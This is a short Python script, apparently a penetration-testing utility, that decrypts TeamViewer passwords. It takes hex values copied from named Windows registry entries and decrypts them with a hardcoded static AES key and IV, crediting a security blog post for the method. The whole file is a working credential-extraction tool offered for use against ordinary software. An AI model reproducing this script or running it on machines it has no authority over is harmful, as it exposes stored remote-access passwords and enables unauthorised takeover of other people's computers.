#!/usr/bin/env python3

import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)
print('''
This is a quick and dirty Teamviewer password decrypter basis wonderful post by @whynotsecurity.
Read this blogpost if you haven't already : https://whynotsecurity.com/blog/teamviewer
 
Please check below mentioned registry values and enter its value manually without spaces.
"SecurityPasswordAES" OR "OptionsPasswordAES" OR "SecurityPasswordExported" OR "PermanentPassword"

''')
hex_str_cipher = input("Enter output from registry without spaces : ")
key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")

ciphertext = binascii.unhexlify(hex_str_cipher)

raw_un = AESCipher(key).decrypt(iv, ciphertext)

password = raw_un.decode('utf-16')
print("Decrypted password is : ",password)
